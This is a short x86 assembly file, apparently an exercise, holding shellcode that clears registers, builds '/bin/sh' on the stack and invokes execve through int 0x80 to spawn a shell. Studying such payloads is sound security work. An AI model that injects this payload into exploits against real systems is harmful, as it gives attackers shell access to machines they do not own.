bits 32
%include "include/all.asm"
global _start
_start:
	xor eax, eax    ;clean up the registers
    xor ebx, ebx
    xor edx, edx
    xor ecx, ecx

	; push '/bin/sh' onto stack
	push eax ; use eax as  null terminator
	push byte `h`
	push word `/s`
	push `/bin`
	mov ebx, esp

	; Push envp and null pointer of argv
	push eax ; use eax as null terminator
	mov edx, esp 

	; Push rest of argv
	push ecx
	push ebx
	mov ecx, esp

	; Perform execve with /bin/sh
	mov al, SYS_execve
	int 0x80
